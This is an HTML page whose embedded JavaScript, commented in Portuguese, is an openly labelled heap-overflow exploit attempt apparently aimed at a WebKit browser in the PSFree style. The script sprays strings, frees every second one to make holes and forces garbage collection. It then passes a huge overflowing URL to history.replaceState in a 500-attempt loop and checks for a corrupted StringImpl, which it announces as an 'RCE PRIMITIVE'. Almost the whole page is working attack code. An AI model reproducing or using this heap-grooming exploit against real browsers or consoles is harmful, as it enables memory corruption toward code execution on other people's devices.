<!DOCTYPE html>
<html>
<head>
    <title>PSFree Logic: Infinite Replace Loop</title>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #1a1a1a; color: #fff; cursor: pointer; }
        #log { margin-top: 20px; border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 2px solid white; }
        .attempt { color: yellow; }
    </style>
</head>
<body>

    <h1>Ataque Infinito (ReplaceState)</h1>
    <p>Usando replaceState para evitar erro de cota de histórico.</p>

    <button onclick="startInfiniteAttack()">INICIAR LOOP INFINITO</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520;
        const OVERFLOW_AMT = 1024 * 64; 

        // Tamanho alvo: 0x50 (80 bytes) - Padrão PSFree
        const TARGET_SIZE = 80; 
        
        // Offset do StringImpl (Header)
        const HEADER_SIZE = 24;
        const DATA_SIZE = TARGET_SIZE - HEADER_SIZE;

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'attempt' ? 'class="attempt"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function sleep(ms=0) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        function gc() {
            try { new Uint8Array(4 * 1024 * 1024); } catch(e){}
        }

        async function startInfiniteAttack() {
            log("Iniciando Loop Infinito...", 'attempt');
            
            // Prepara o "Pad" (Recheio) usando a técnica de 8 bits
            const pad = "B".repeat(DATA_SIZE);

            let attempt = 0;
            
            // Agora podemos rodar muito mais vezes porque replaceState limpa o lixo
            const MAX_ATTEMPTS = 500; 

            while(attempt < MAX_ATTEMPTS) {
                attempt++;
                // Loga a cada 5 tentativas para não poluir a tela
                if(attempt % 5 === 0 || attempt === 1) log(`--- Tentativa ${attempt} ---`);

                // 1. SPRAY (Criar Strings)
                victims = [];
                // Reduzi levemente a quantidade para acelerar o ciclo
                for(let i=0; i<4000; i++) {
                    let s = [pad, i].join(""); 
                    s = s.substring(0, DATA_SIZE);
                    victims.push(s);
                }

                // 2. BURACOS (Queijo Suíço)
                for(let i=0; i<victims.length; i+=2) {
                    victims[i] = null;
                }
                
                gc();
                await sleep(20); // Delay curto é melhor para "Hot Swap"

                // 3. EXPLOIT (Usando REPLACE para evitar erro de cota)
                try {
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    // A MUDANÇA CRUCIAL:
                    history.replaceState({}, "pwn", "/" + buffer);
                    
                    // 4. CHECAGEM
                    if (checkVictory(DATA_SIZE)) {
                        return; // Venceu
                    }

                } catch(e) {
                    // Se der erro de cota mesmo com replace, ou erro de memória
                    log(`Erro na tentativa ${attempt}: ${e.message}`);
                    
                    // Se o erro for crítico, limpamos tudo e esperamos
                    victims = null;
                    await forceGC();
                    await sleep(1000);
                }

                // Limpeza do ciclo
                victims = null;
                // GC agressivo a cada 10 tentativas para evitar OOM real
                if(attempt % 10 === 0) await forceGC();
                else gc();
                
                await sleep(50);
            }
            
            log("Falha após todas as tentativas.");
        }

        function checkVictory(originalLen) {
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                // Checa tamanho
                if (s.length !== originalLen) {
                    log(`!!! SUCESSO !!! String ${i} corrompida!`, 'win');
                    log(`Novo Tamanho: ${s.length}`, 'win');
                    alert("RCE PRIMITIVE: STRINGIMPL CORRUPTED!");
                    return true;
                }
                
                // Checa conteúdo (byte 'B' = 66)
                // Se virar 1, pegamos o overflow
                if (s.charCodeAt(0) !== 66) {
                     log(`!!! SUCESSO !!! Conteúdo alterado no index ${i}`, 'win');
                     alert("RCE PRIMITIVE: CONTENT CORRUPTED!");
                     return true;
                }
            }
            return false;
        }

        async function forceGC() {
            try { new ArrayBuffer(20 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 500));
        }
    </script>
</body>
</html>
